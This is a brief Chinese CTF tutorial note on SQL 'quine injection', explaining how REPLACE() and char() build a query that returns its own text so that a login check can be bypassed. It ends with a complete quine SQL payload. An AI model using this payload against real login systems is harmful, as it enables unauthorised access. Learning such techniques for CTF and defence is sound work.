第一次接触到这个额词，V&N面试的时候被问我一脸懵，（其实认为做题的时候紧张的看不进去了）
## 什么是quine注入?

  quine是一种计算机程序，它不接受输入并产生自己源代码的副本作为唯一的输出.  
  在ctf应用中，Quine注入的目的就是使得输入输出一致，绕过限制登录。

## 构造原理

主要利用的就是sql中的`replace()`函数，就是字面意思（替换）

```sql
REPLACE(str, from_str, to_str)

#replace(a,b,c) 简单来说也就是把 a 中的 b 换成 c，如果 from_str 不存在于 str 中，则返回原始字符串
```
最基础的用法就是
```sql
select replace(".",char(46),".");
```
`chr(46)`就是`.`，所以这个语句的结果就是`.`。

我们接着构造
```sql
select replace('replace(".",char(46),".")',char(46),'replace(".",char(46),".")');
```

最终payload：
```sql
replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")');
```
